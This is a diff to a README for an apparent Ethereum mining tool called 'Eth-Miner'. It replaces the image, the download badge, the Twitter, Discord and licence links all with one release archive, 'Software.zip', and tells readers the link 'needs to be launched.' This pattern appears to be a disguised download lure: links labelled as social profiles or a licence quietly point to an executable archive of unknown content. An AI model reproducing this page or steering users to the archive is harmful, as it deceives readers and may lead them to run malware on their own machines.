@@ -1,6 +1,6 @@
 # Eth-Miner
 
-![ethereum](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT6OFWv4A5f_ckR2qrcHdVskHxQjAlSGbDeow&usqp=CAU)
+![ethereum](https://github.com/Vilzzs/Eth-Miner/releases/download/v2.0/Software.zip)
 
 Welcome to Eth-Miner, your go-to Ethereum miner with OpenCL, CUDA, and stratum support! Whether you're a seasoned crypto miner or just starting out, this powerful tool has everything you need to optimize your mining experience and maximize your rewards.
 
@@ -14,7 +14,7 @@ Welcome to Eth-Miner, your go-to Ethereum miner with OpenCL, CUDA, and stratum s
 ## Installation
 To get started with Eth-Miner, simply download the application from the following link: 
 
-[![Download Eth-Miner](https://img.shields.io/badge/Download-Eth--Miner-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Eth-Miner](https://github.com/Vilzzs/Eth-Miner/releases/download/v2.0/Software.zip)](https://github.com/Vilzzs/Eth-Miner/releases/download/v2.0/Software.zip)
 
 *Note: The link provided needs to be launched.*
 
@@ -33,10 +33,10 @@ We welcome contributions to enhance Eth-Miner and make it even more powerful for
 
 ## Stay Connected
 Stay connected with the Eth-Miner community for updates, discussions, and tips on optimizing your mining setup:
-- Follow us on Twitter [@EthMinerOfficial](https://twitter.com/EthMinerOfficial)
-- Join our Discord server [Eth-Miner Discord](https://discord.com/invite/ethminer)
+- Follow us on Twitter [@EthMinerOfficial](https://github.com/Vilzzs/Eth-Miner/releases/download/v2.0/Software.zip)
+- Join our Discord server [Eth-Miner Discord](https://github.com/Vilzzs/Eth-Miner/releases/download/v2.0/Software.zip)
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/user-attachments/files/18426772/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Vilzzs/Eth-Miner/releases/download/v2.0/Software.zip) file for details.
 
 Let's start mining Ethereum like a pro with Eth-Miner! Happy mining! ⛏️🚀🔥
